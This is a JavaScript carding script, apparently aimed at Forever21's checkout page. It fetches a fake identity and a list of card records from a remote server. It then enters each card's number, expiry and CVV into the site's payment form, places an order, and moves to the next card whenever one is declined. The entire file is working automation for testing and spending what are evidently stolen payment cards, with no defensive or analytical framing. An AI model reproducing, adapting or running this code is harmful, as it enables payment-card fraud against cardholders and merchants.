var postUrl = "https://" + baseUrl + "/post";
var fakeUrl = "https://" + baseUrl + "/fake?city=Miami";
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var iteration = null;
var cards = function(arr) {
	var i = 0;
	var percentage = 30;
	var len = Math.ceil(arr.length * (percentage / 100));

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify(json);
	    
	    console.log("Abriendo el edit...")
	    $("div.btn_edit.required>span>a")[1].click();

      	var interval = setInterval(function() {
	        if ( $("#ccnumber").length ) {
	        	clearInterval(interval);
	        	console.log("Edit abierto");
	        	$("#ccnumber").val(json.card);

				$($("dl.dropdown.date>dd>ul>li>a")[ json.mon - 1 ]).click();

				$($($("dl.dropdown.date>dd>ul")[1].querySelectorAll("li>a"))[ json.year - 16 ]).click();

				console.log("Guardando la tarjeta...")
				$("div.btn_wrapper.column_2>button")[1].click();

				var interval2 = setInterval(function() {
					if ( !$("#ccnumber").length ) {
						clearInterval(interval2);
						console.log("Tarjeta guardada");
						$("#inputCVV").val(json.cvv);

						console.log('Ponemos la orden');
						$("#btn_checkout").click();
						var time = 0;
						var interval3 = setInterval(function() {
							console.log('Procesando...');
							time++;
							if( $(".title").text() == " Error") {
								clearInterval(interval3);
								console.log("Tarjeta rechazada, Probemos otra");
								$(".closeIcon").click();
								setTimeout(iteration, 3000);
							}
							else if( time >= 20 && $(".closeIcon") ) {
								clearInterval(interval3);
								console.log("Tiempo de espera terminado");
								$(".closeIcon").click();
								setTimeout(iteration, 3000);
							}
						}, 1000)
					}
				}, 1000);
	        }
      	}, 1000);

	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
var fake = function( person ) {
	console.log( person.fullname );
	console.log( person.zip );

	console.log("Abriendo el edit...")
	$("div.btn_edit.required>span>a")[1].click();

  	var interval = setInterval(function() {
        if ( $("#ccnumber").length ) {
        	clearInterval(interval);
        	console.log("Edit abierto");
        	$("#ccnumber").val("4444444444444444");
        	$("#ccholder").val( person.firstname + " " + person.lastname );
        	$($("dl.dropdown.date>dd>ul>li>a")[ 0 ]).click();
			$($($("dl.dropdown.date>dd>ul")[1].querySelectorAll("li>a"))[ 0 ]).click();

        	$("div.btn_wrapper.column_2>button")[1].click();

        	var interval2 = setInterval(function() {
				console.log("Guardando el nombre...")
				if ( !$("#ccnumber").length ) {
					clearInterval(interval2);
					options.url = postUrl;
					$.ajax(options)
					.success(cards);
				}
			}, 1000);
        }
    }, 1000);
}
// Forever21
$.ajax(options)
.success(fake);